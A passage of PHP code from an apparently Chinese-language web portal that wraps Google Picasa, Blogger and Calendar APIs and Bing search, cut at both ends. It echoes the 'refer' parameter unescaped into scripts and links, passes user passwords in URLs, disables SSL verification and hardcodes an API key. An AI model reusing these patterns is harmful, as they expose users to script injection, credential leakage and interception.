                $timeout = "5000";
                if ($photocreate['typeflag'] == "other"){
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                        相片添加未完成！原因是：不支持上传该类型相片！<?php  echo $timeout/1000?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        echo "<p align=center><script>window.setTimeout(\"location.href=\'".trim(request("refer"))."\'\",".$timeout.");</script></p>"
                ?>
</table>                        
                <?php 
                }
                elseif (iconv('utf-8','gb2312',$photocreate['photoid']) != false && iconv('utf-8','gb2312',$photocreate['photoid'] != "")){
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
                <?php 
                		if(!is_wap()){
								?>
        <tr class="tdbg">
                <td align="center" id="result">
                相片添加成功！相片ID：<?php echo iconv('utf-8','gb2312',$photocreate['photoid']);?><?php  echo " <br>".($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        if (trim(request("refer")) != "")
                                echo "<p align=center><script>window.setTimeout(\"location.href=\'".trim(request("refer"))."\'\",".$timeout.");</script></p>";
                        else
                                echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>";
                    }
                    else{
								?>
        <tr class="tdbg">
                <td align="center" id="result">
                相片添加成功！相片ID：<?php echo iconv('utf-8','gb2312',$photocreate['photoid']);?><a href="<?php  echo trim(request("refer")); ?>">返回上一页</a>
                </td>
        </tr>   
                <?php                     	
                        if (trim(request("refer")) != ""){
                                //echo "<p align=center><script>window.setTimeout(\"location.href=\'".trim(request("refer"))."\'\",".$timeout.");</script></p>";
                        }        
                        else{
                                //echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>";
                        }        
                    }
                ?>
</table>                        
                <?php       
                }
                else{
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                相片添加失败！失败原因：<?php echo $photocreate['xmlstr'];?><?php  echo " <br>".($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>"
                ?>
</table>                        
                <?php       
                }

                break; // action - photo.create end
        case "photo.remove": // action - photo.remove start
                if (trim(request("delok")) == "1"){
                        if (trim(request("authclientLogin")) == "" || stripos(trim(request("authclientLogin")),"Bad")){
                                redirect(scriptpath()."?api=picasa&skin=".$skincolor."&uname=&pwd=&action=");
                                break;
                        }                       
                }
                else{

                ?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           

        <tr class="tdbg">
                <td align="center" id="result">
											<a hreF='#' onclick='window.location.href="<?php echo httpPath()."?".$_SERVER['QUERY_STRING'];?>&delok=1";'>确认</a>
											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>取消</a>
                </td>
        </tr>  
</table> 
				<?php 
                        break;


                }
                $google_album = new google_class();
                $photoremove = $google_album->googlephotoremove(trim(request("authclientLogin")),trim(request("albumid")),trim(request("photoid")),$page,$pagesize);
                //print_r($photoremove);
                //return;
                
                $timeout = "5000";
                if ($photoremove['xmlstr'] == "" && $photoremove['code'] == '200'){
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                图片删除成功！<?php  echo $timeout/1000?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        if (count($_POST)==0)
                                echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>";
                        else                            
                                echo "<p align=center><script>window.setTimeout(\"history.go(-1)\",".$timeout.");</script></p>";
                ?>
</table>                        
                <?php 
                }
                elseif ($photoremove['xmlstr'] != "" && $photoremove['xmlstr'] != "wait"){
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                图片删除失败！原因： <?php echo $photoremove['xmlstr'];?><?php  echo " <br>".($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        if (count($_POST)==0)
                                echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>";
                        else                            
                                echo "<p align=center><script>window.setTimeout(\"history.go(-1)\",".$timeout.");</script></p>";
                ?>
</table>                        
                <?php       
                }
                elseif ($photoremove['xmlstr'] != "" && $photoremove['xmlstr'] == "wait"){
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                图片删除失败！原因：“未选择任何条目！”<?php  echo " <br>".($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        if (count($_POST)==0)
                                echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>";
                        else                            
                                echo "<p align=center><script>window.setTimeout(\"history.go(-1)\",".$timeout.");</script></p>";
                ?>
</table>                        
                <?php       
                }
                
                break; // action - album.remove end
        case "digest.list": // action - digest.list start
                if (trim(request("logout")) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("uname");
}                         
                        $_SESSION["uname"] = "";  
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("pwd"); 
}                               
                        $_SESSION["pwd"] = ""; 
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("authclientLogin"); 
}                         
                       $_SESSION["authclientLogin"] = "";      
                        redirect(scriptpath()."?api=blogger&skin=".$skincolor."&uname=&pwd=&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&authclientLogin=".encodeuri(trim(request("authclientLogin"))));
                        break;
                }
                elseif (trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("uname");
}
                        $_SESSION["uname"] = trim(request("uname"));    
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("pwd"); 
} 
                        $_SESSION["pwd"] = trim(request("pwd"));        
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("authclientLogin"); 
} 
                        $_SESSION["authclientLogin"] = trim(request("authclientLogin"));        
                }       
                elseif ($_SESSION["uname"] != "" && $_SESSION["pwd"] != "" && $_SESSION["authclientLogin"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == "" && trim(request("authclientLogin")) == ""){
                        redirect(scriptpath()."?api=blogger&skin=".$skincolor."&uname=".encodeuri(base64_encode(trim($_SESSION["uname"])))."&pwd=".encodeuri(base64_encode(trim($_SESSION["pwd"])))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&authclientLogin=".encodeuri($_SESSION["authclientLogin"]));
                        break;
                }       
                elseif (trim(request("uname")) == "" || trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=blogger&skin=".$skincolor."&uname=&pwd=&action=&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&authclientLogin=".encodeuri(trim(request("authclientLogin"))));
                        break;
                }       
                elseif (trim(request("authclientLogin")) == "" || stripos(trim(request("authclientLogin")),"Bad")){
                        redirect(scriptpath()."?api=blogger&skin=".$skincolor."&uname=&pwd=&action="."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&authclientLogin=");
                        break;
                }
                if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
			$xmlstr = "<?php xml version='1.0' encoding='UTF-8'?><feed xmlns='http://www.w3.org/2005/Atom' xmlns:gphoto='http://schemas.google.com/photos/2007' xmlns:media='http://search.yahoo.com/mrss/' xmlns:openSearch='http://a9.com/-/spec/opensearchrss/1.0/' xmlns:gml='http://www.opengis.net/gml' xmlns:georss='http://www.georss.org/georss'><id>http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org</id><updated>2010-04-12T14:11:45.201Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#user'/><title type='text'>wanw.x3193.3322.org</title><subtitle type='text'/><icon>http://lh5.ggpht.com/_dm6qv9_mhy8/AAAA4tc3130/AAAAAAAAAAA/q8cyJASE9Zg/s64-c/wanw.x3193.3322.org.jpg</icon><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org'/><link rel='http://schemas.google.com/photos/2007#slideshow' type='application/x-shockwave-flash' href='http://picasaweb.google.com/s/c/bin/slideshow.swf?host=picasaweb.google.com&amp;RGB=0x000000&amp;feed=http%3A%2F%2Fpicasaweb.google.com%2Fdata%2Ffeed%2Fapi%2Fuser%2Fwanw.x3193.3322.org%3Falt%3Drss'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org?start-index=1&amp;max-results=1000'/><author><name>Yu</name><uri>http://picasaweb.google.com/wanw.x3193.3322.org</uri></author><generator version='1.00' uri='http://picasaweb.google.com/'>Picasaweb</generator><openSearch:totalResults>2</openSearch:totalResults><openSearch:startIndex>1</openSearch:startIndex><openSearch:itemsPerPage>1000</openSearch:itemsPerPage><gphoto:user>wanw.x3193.3322.org</gphoto:user><gphoto:nickname>Yu</gphoto:nickname><gphoto:thumbnail>http://lh5.ggpht.com/_dm6qv9_mhy8/AAAA4tc3130/AAAAAAAAAAA/q8cyJASE9Zg/s64-c/wanw.x3193.3322.org.jpg</gphoto:thumbnail><entry><id>http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5457372612442727137</id><published>2010-04-07T07:00:00.000Z</published><updated>2010-04-07T12:32:58.013Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#album'/><title type='text'>X3193</title><summary type='text'/><rights type='text'>public</rights><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5457372612442727137'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org/X3193'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5457372612442727137'/><author><name>Yu</name><uri>http://picasaweb.google.com/wanw.x3193.3322.org</uri></author><gphoto:id>5457372612442727137</gphoto:id><gphoto:name>X3193</gphoto:name><gphoto:location/><gphoto:access>public</gphoto:access><gphoto:timestamp>1270623600000</gphoto:timestamp><gphoto:numphotos>0</gphoto:numphotos><gphoto:user>wanw.x3193.3322.org</gphoto:user><gphoto:nickname>Yu</gphoto:nickname><gphoto:commentingEnabled>true</gphoto:commentingEnabled><gphoto:commentCount>0</gphoto:commentCount><media:group><media:content url='http://lh6.ggpht.com/_dm6qv9_mhy8/S7x7egOYIuE/AAAAAAAAACU/hc0BNeb8c7I/X3193.jpg' type='image/jpeg' medium='image'/><media:credit>Yu</media:credit><media:description type='plain'/><media:keywords/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S7x7egOYIuE/AAAAAAAAACU/hc0BNeb8c7I/s160-c/X3193.jpg' height='160' width='160'/><media:title type='plain'>X3193</media:title></media:group></entry><entry><id>http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5459253500704784833</id><published>1970-01-15T17:04:41.000Z</published><updated>2010-04-12T14:11:45.201Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#album'/><title type='text'>TEST</title><summary type='text'>TEST</summary><rights type='text'>public</rights><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5459253500704784833'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org/TEST'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5459253500704784833'/><author><name>Yu</name><uri>http://picasaweb.google.com/wanw.x3193.3322.org</uri></author><gphoto:id>5459253500704784833</gphoto:id><gphoto:name>TEST</gphoto:name><gphoto:location>China</gphoto:location><gphoto:access>public</gphoto:access><gphoto:timestamp>1271081000</gphoto:timestamp><gphoto:numphotos>0</gphoto:numphotos><gphoto:user>wanw.x3193.3322.org</gphoto:user><gphoto:nickname>Yu</gphoto:nickname><gphoto:commentingEnabled>true</gphoto:commentingEnabled><gphoto:commentCount>0</gphoto:commentCount><media:group><media:content url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8MqInBRAcE/AAAAAAAAAGk/zb43PQvhyLQ/TEST.jpg' type='image/jpeg' medium='image'/><media:credit>Yu</media:credit><media:description type='plain'>TEST</media:description><media:keywords/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8MqInBRAcE/AAAAAAAAAGk/zb43PQvhyLQ/s160-c/TEST.jpg' height='160' width='160'/><media:title type='plain'>TEST</media:title></media:group><georss:where><gml:Envelope><gml:lowerCorner>18.080862 73.5351877</gml:lowerCorner><gml:upperCorner>53.6424579 134.8556062</gml:upperCorner></gml:Envelope><gml:Point><gml:pos>35.86166 104.195397</gml:pos></gml:Point></georss:where></entry></feed>";
                }       
                else{
                        $ch = curl_init();
                $header[] = "Authorization: GoogleLogin auth=".trim(request("authclientLogin"));
                        $header[] = "GData-Version: 2";                 
                        $url = "http://www.blogger.com/feeds/default/blogs?start-index=1&max-results=1000000";
                        $ch = curl_init();
                        curl_setopt($ch, CURLOPT_URL, $url);
                        curl_setopt($ch, CURLOPT_HEADER, 0);
                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                        $xmlstr = curl_exec($ch);
                        curl_close($ch);
                }
                $objXml = new DOMDocument();  
                $objXml->preserveWhiteSpace = true;
                $objXml->async = false; 
                $objXml->loadXML($xmlstr);
                echo $xmlstr;
                $objList = $objXml->getElementsByTagName("entry");                      
                if ($objList->length > $pagesize) $strpagesize = $pagesize; else $strpagesize = $objList->length;
                ?>
<script language="JavaScript" type="text/javascript">
function selitemall()
{
 i=<?php echo $strpagesize*($page-1);?>;
 while(eval('document.blooger.chidd'+i))
 {
  eval('document.blogger.chidd'+i).checked = document.blogger.allitem.checked;
  i++;
 }
}
function delitem()
{
 if(!confirm('确定删除选中的文件吗?')) return;
 document.blogger.action='<?php echo ScriptPath()."?api=blogger&action=".encodeuri("digest.remove")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&delok=1';
 document.blogger.submit();
}
</script>       
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3"> 查 询 结 果 : 共 <?php echo $objList->length;?> 条 </td>
        </tr>
</table>
<?php 
                break;
                        // action - digest.list end
        case "calendar.reminder": // action - calendar.reminder start
                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                $xmlstr = "";
                                $xmlcode = "201";       
                        }       
                        else{   
                                $url = "https://www.google.com/calendar/feeds/default/private/full";
                                date_default_timezone_set('UTC'); 
                                list($msec, $sec) = explode(" ", microtime());
                                $startTime = $sec + 60*0;
                                $endTime = $startTime + 60*0 + 7;
                                //echo date("YmdHis",$sec+3600*8); 
                                $postdata = "<?php xml version='1.0' encoding='gb2312'?><entry xmlns='http://www.w3.org/2005/Atom' xmlns:gd='http://schemas.google.com/g/2005'>".
                                        "<category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/g/2005#event'></category>".
                                        "<title type='text'>标题：我我我我我我我我</title>".
                                        "<content type='text'>内容：我!!!</content>".
                                        "<gd:transparency value='http://schemas.google.com/g/2005#event.opaque'>".
                                        "</gd:transparency>".
                                        "<gd:eventStatus value='http://schemas.google.com/g/2005#event.confirmed'>".
                                        "</gd:eventStatus>".
                                        "<gd:where valueString='我'></gd:where>".
                                        "<gd:when startTime='".date("Y",$sec)."-".date("m",$startTime)."-".date("d",$startTime)."T".date("H",$startTime).":".date("i",$startTime).":".date("s",$startTime).".000Z' endTime='".date("Y",$endTime)."-".date("m",$endTime)."-".date("d",$endTime)."T".date("H",$endTime).":".date("i",$endTime).":".date("s",$endTime).".000Z'>".
                                        "<gd:reminder minutes='0' method='sms' />".
                                        "</gd:when>".
                                        "</entry>";     
                                unset($header);

                                $header[] = "Authorization: GoogleLogin auth=".trim(request("authclientLogin"));
                                $header[] = "Content-type: application/atom+xml; charset=gb2312";
                                $header[] = "Content-length: ".strlen($postdata);
                                //$header[] = "If-Match: *";
                                $header[] = "GData-Version: 2";
                                //$header[] = $postdata;                
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                //curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_TIMEOUT, 150);                                                 
                                $xmlstr = curl_exec($ch);
                                $xmlcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
                                curl_close($ch);
                                if($xmlcode == '302'){
                                        //echo $xmlstr;
                                        $gsessionid = substr($xmlstr,stripos($xmlstr, 'gsessionid=')+strlen('gsessionid='),strlen($xmlstr));
                                        $gsessionid = substr($gsessionid,0,stripos($gsessionid, '">here</A>'));
                                        //echo $gsessionid;
                                        //echo date("YmdHis",$sec+3600*8);
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_URL, $url.'?gsessionid='.$gsessionid);
                                        curl_setopt($ch, CURLOPT_HEADER, 1);
                                        //curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
                                        curl_setopt($ch, CURLOPT_POST, 1);
                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        curl_setopt($ch, CURLOPT_TIMEOUT, 150);                                                 
                                        $xmlstr = curl_exec($ch);
                                        $xmlcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
                                        curl_close($ch);
                                        echo $xmlstr.$xmlcode;                          
                                }
                        }
                break;  // action - digest.list end
        default :
                    if ($_SESSION["google"]["uname"] != "" && $_SESSION["google"]["pwd"] != "" && $_SESSION["google"]["authclientLogin"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == "" && trim(request("authclientLogin")) == ""){
                        if (trim(request("api")) == "picasa"){
                        ?>
                                <?php  redirect(ScriptPath()."?api=".trim(request("api"))."&action=".encodeuri('album')."&skin=".$skincolor."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));?>
                        <?php 
                        }
                        elseif (trim(request("api")) == "calendar"){
                        ?>
                                <?php  redirect(ScriptPath()."?api=".trim(request("api"))."&action=".encodeuri('calendar')."&skin=".$skincolor."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));?>
                        <?php 
                        }
                        elseif (trim(request("api")) == "urlshortener"){
                        ?>
                                <?php  redirect(ScriptPath()."?api=".trim(request("api"))."&action=".encodeuri('urlshortener')."&skin=".$skincolor."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));?>
                        <?php 
                        }
                     }          
                        $style = new css();
?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="35" valign="center">
                <td align="center" valign="center" id="google">
                        <form action="<?php echo ScriptPath();?>?api=<?php echo trim(request("api"));?>&skin=<?php  echo $skincolor;?>&c=<?php echo encodeuri(trim(request("c")))?>&t=<?php echo encodeuri(trim(request("t")))?>&u=<?php echo encodeuri(trim(request("u")))?>" method="post" name="google">
                        &nbsp用户名：<input type="text" class="text" name="uname" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->textarea("#FCFC9D",""); ?>>  
                        &nbsp密码：<input type="password" class="text" name="pwd" value="" style="height:20px;width:10%;font-size:11px" <?php  $style->textarea("#FCFC9D",""); ?>> 
                        &nbsp选项：
                        <SELECT name="action" size="1" <?php  $style->selectarea("#FCFC9D","");?> style="width:60px;height:16px;font-size:12px">
                        <?php 
                        if (trim(request("api")) == "picasa"){
                        ?>
                                <OPTION VALUE="album">相册</OPTION>
                        <?php 
                        }
                        elseif (trim(request("api")) == "calendar"){
                        ?>
                                <OPTION VALUE="calendar">日历</OPTION>
                        <?php 
                        }
                        elseif (trim(request("api")) == "urlshortener"){
                        ?>
                                <OPTION VALUE="<?php  echo encodeuri('urlshortener'); ?>">网址</OPTION>
                        <?php 
                        }
                        else{
                        ?>
                                <OPTION VALUE="album">相册</OPTION>
                                <OPTION VALUE="urlshortener">网址</OPTION>
                                <OPTION VALUE="digest">网摘</OPTION>
                                <OPTION VALUE="calendar">日历</OPTION>
                                <OPTION VALUE="doc">文件</OPTION>
                                <OPTION VALUE="contact">通讯录</OPTION>
                        <?php 
                        }
                        ?>
                        </SELECT>
                        &nbsp验证码：<input <?php  $style->textarea("#FCFC9D",""); ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>
<?php 
break;
}
$style->footer();
exit;
}

?>

<?php 

// Bing Search Api
// Developer Website : http://cn.bing.com/developers/appids.aspx
// ApiKey : 0F2CE2474CC3203A198DE98006CA5810A8C4BC9B
// Version : V2.0

// Model:
// start
//  switch ... break
// end

function bing() { // bing function start 
header('Content-Type: text/html; charset=gb2312');

//echo $_COOKIE["X3193"]['global'][$iplimiter]['verify']['result'].$_COOKIE["X3193"]['global'][$iplimiter]['verify']['success'];

// 启用翻译
if (trim(request('transfrom')) != "")
        $Sources = "Translation";
elseif (trim(request('Sources')) != "")
        $Sources = trim(request('Sources'));
else
        $Sources = 'Web';

$BingAppId = 'm6JvX/s5J8RF97Ip7um8pPRR0Kesh+G7HYSH/QiN3X0=';

?>
<head>
<?php 
$style = new css();
$style->ico();

if (trim(request('api')) == "" && trim(request('Query')) == "" && !is_wap())
	$query = formatchar("试玩游戏赚钱");
else
	$query = trim(request('Query'));
        
if (trim($_SERVER['QUERY_STRING']) == "")
        $style->title("X3193 - ".formatchar("网络"));
elseif ($query != "")
        $style->title("X3193 - ".formatchar("搜索 -> ".$query));
else
        $style->title("X3193 - ".formatchar("搜索"));
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行        
?>

<?php 

// 每页条数
if (trim(request('api')) == "" && trim(request('Query')) == "" && !is_wap())
        $pagesize = 60;
elseif (trim(request('pagesize')) == "")
        $pagesize = 30;
elseif (trim(request('pagesize')) > 50)
        $pagesize = 50;
else
        $pagesize = trim(request('pagesize'));

if (trim(request('market')) != "")
        $marketstr = trim(request('market'));
elseif (trim(request('market')) == "")
        $marketstr = 'zh-CN';

$tag = New TagAction(); 
switch (trim(request('action'))) {  // case start
        case "getinfo":
                $tag->getinfo(httppath()."?api=bing&skin=".$skincolor."&transfrom=".encodeuri(trim($_GET['transfrom']))."&market=".encodeuri(trim($_GET['market']))."&action=Cento",'link','780','500');
                break;
        case "Cento":
                $tag->jscento();
?>
<form action="<?php  echo ScriptPath(); ?>?api=bing" method="post" name="bing">
<table width="100%" height="90%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="center" valign="center">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                        	 IF(!is_wap())
                        	sellink("主页|插件|搜索|地球|域名|相册|网址|FTP|读书|邮箱|游戏|邮件|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|相册|网址|FTP|邮箱|邮件|短片",$skincolor);
                        ?>
                </td>           
        </tr>
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="center" height="35" class="tdtbg" valign="middle">
                        <input name="Query" value="<?php  echo $query; ?>" style="height:20px;width:90px;font-size:11px" <?php  $style->textarea("#FCFC9D",""); ?>>
                        网页<input type="radio" name="Sources" value="web" <?php  if ($Sources=="web") echo 'checked'; elseif ($Sources=="") echo 'checked'; ?>> 
                        新闻<input type="radio" name="Sources" value="news" <?php if ($Sources=="news") echo 'checked'; ?>> 
                        图片<input type="radio" name="Sources" value="image" <?php if ($Sources=="image") echo 'checked'; ?>> 
                        视频<input type="radio" name="Sources" value="video" <?php if ($Sources=="video")  echo 'checked'; ?>> 
                        手机<input type="radio" name="Sources" value="MobileWeb" <?php if ($Sources=="MobileWeb")  echo 'checked'; ?>> 
                        <noscript>
                        电话<input type="radio" name="Sources" value="phonebook" <?php if ($Sources=="phonebook") ?>checked onclick="vbscript:getphone()"> 
                        问答<input type="radio" name="Sources" value="instantanswer" <?php if ($Sources=="InstantAnswer") ?>checked> 
                        </noscript>
                        <SELECT name="transfrom" size="1" <?php  $style->selectarea("#FCFC9D",""); ?> style="width:75px;height:16px;font-size:12px">
                        <OPTION VALUE="">源语种</OPTION>
                        <?php 
                        $langfrom = "Ar,Arabic|zh-CHS,简体中文|zh-CHT,繁w中文|Nl,Dutch|En,English|Fr,French|De,German|It,Italian|Ja,Japanese|Ko,Korean|Pl,Polish|Pt,Portuguese|Ru,Russian|Es,Spanish";
                        for($langfromi = 0; $langfromi < count(split("[|]",$langfrom));$langfromi++){
                        ?>
                                <OPTION VALUE="<?php  echo arrmember(split("[,]",arrmember(split("[|]",$langfrom),$langfromi)),(0));?>" <?php  if (trim($_GET['transfrom']) == arrmember(split("[,]",arrmember(split("[|]",$langfrom),$langfromi)),0)) echo 'selected';?>><?php  echo arrmember(split("[,]",arrmember(split("[|]",$langfrom),$langfromi)),(1));?></OPTION>
                        <?php 
                        }
                        ?>
                        <OPTION VALUE="">不选择...</OPTION>
                        </SELECT>
                        <SELECT name="market" size="1" <?php  $style->selectarea("#FCFC9D","") ?> style="width:175px;height:16px;font-size:12px">
                        <?php 
